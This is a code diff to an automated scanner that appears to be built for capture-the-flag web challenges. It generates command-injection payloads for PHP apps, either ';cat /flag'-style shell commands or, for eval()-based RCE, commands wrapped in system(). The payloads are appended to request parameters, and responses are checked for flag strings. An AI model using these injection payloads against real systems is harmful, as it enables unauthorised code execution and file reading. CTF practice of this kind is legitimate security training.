@@ -420,22 +420,32 @@ class AdaptiveScheduler:
 
         # Add smart escalation tasks at the end (flag file reads)
         if php_vuln_types & {'RCE', 'LFI', 'PHP'}:
+            # Check for eval()-based RCE (needs PHP code, not raw shell)
+            php_vulns = fingerprint.get('php_vulns', [])
+            is_eval_rce = any('eval()' in v.get('reason', '') for v in php_vulns if v['type'] == 'RCE')
             for flag_cmd in [
                 'cat /flag', 'cat /flag.txt', 'cat /fla*', 'cat /f*',
                 'cat flag.txt', 'cat flag', 'cat /etc/flag',
                 'tac /flag', 'nl /flag', 'head -c 100 /flag',
                 'find / -name "flag*" 2>/dev/null',
             ]:
+                if is_eval_rce:
+                    # eval() needs PHP code: wrap shell in system() or backticks
+                    payload = f"system('{flag_cmd}');"
+                    ptip = 'eval→system读flag文件'
+                else:
+                    payload = ';' + flag_cmd
+                    ptip = '直接读flag文件'
                 tasks.append({
                     'url': url,
                     'param': (params[0] if params else 'a'),
                     'payload_def': {
                         'name': f'flag:{flag_cmd[:20]}',
-                        'payload': ';' + flag_cmd,   # prefix separator for cmd injection
-                        'method': 'append',            # append so base value stays + cmd injected
+                        'payload': payload,   # PHP-wrapped for eval, ;prefixed for system
+                        'method': 'append',   # append so base value stays + cmd injected
                         'detect': 'content',
                         'match': ['flag{', 'CTF{', 'ISCC{', 'Geesec{', 'DASCTF{'],
-                        'tip': '直接读flag文件',
+                        'tip': ptip,
                     },
                     'method': method,
                     'form_inputs': None,
